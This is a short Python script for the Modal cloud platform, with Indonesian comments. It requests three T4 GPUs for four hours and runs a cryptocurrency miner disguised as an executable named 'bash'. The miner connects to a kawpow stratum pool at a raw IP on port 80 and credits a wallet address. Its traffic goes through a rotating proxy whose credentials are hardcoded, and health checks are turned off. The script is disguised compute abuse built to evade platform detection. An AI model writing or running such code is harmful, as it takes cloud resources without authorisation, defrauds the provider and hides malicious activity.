import modal
import subprocess
import time

app = modal.App("t4x3-runner")

image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
    )
    .apt_install(
        "bash",
        "python3",
        "python3-pip",
        "python-is-python3"   # 🔥 INI KUNCI UTAMA
    )
)

@app.function(
    image=image,
    gpu=modal.gpu.T4(count=3),   # 🔥 T4 x3
    timeout=60 * 60 * 4          # ⏱️ 4 jam
)
def run_script():
    # 1️⃣ Pastikan Python terdeteksi
    subprocess.run(["python", "--version"], check=True)

    # 2️⃣ Pastikan GPU ada
    subprocess.run(["nvidia-smi"], check=True)

    # 3️⃣ Jalankan script
    subprocess.run(
        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "],
        check=False
    )

    print("Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)
